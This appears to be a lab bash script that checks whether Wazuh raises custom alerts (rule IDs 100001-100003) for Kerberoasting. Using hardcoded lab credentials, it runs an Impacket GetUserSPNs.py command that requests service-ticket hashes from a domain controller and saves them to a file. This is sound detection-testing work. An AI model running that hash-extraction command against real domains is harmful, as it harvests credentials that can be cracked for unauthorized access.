#!/bin/bash
# ============================================================
# Test Wazuh Detection - Kerberoasting
# ============================================================
# Description: Simulates a Kerberoasting attack and checks
#              if Wazuh generates the expected alert.
# ============================================================

set -e

# ---- Configuration ----
DC_IP="192.168.100.10"
DOMAIN="lab.local"
USER="user1"
PASS="User@1234"

# ---- Colors ----
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}[*] Starting Wazuh detection test...${NC}"

# ---- Step 1: Run Kerberoasting attack ----
echo -e "${CYAN}[*] Step 1: Running Kerberoasting attack...${NC}"
GetUserSPNs.py ${DOMAIN}/${USER}:${PASS} -dc-ip ${DC_IP} -request -outputfile /tmp/test_hash.txt

echo -e "${GREEN}[+] Attack executed. TGS hash extracted.${NC}"

# ---- Step 2: Wait for Wazuh to process ----
echo -e "${CYAN}[*] Step 2: Waiting 15 seconds for Wazuh to process...${NC}"
sleep 15

# ---- Step 3: Check Wazuh alerts ----
echo -e "${CYAN}[*] Step 3: Checking Wazuh dashboard for alerts...${NC}"
echo -e "${CYAN}    Open https://192.168.100.40 and search for:${NC}"
echo -e "${CYAN}    - rule.id:100001 (Kerberoasting - RC4)${NC}"
echo -e "${CYAN}    - rule.id:100002 (Kerberoasting - Multiple)${NC}"
echo -e "${CYAN}    - rule.id:100003 (svc_sql target)${NC}"
echo ""
echo -e "${GREEN}[+] Test complete. Verify alerts in the Wazuh dashboard.${NC}"
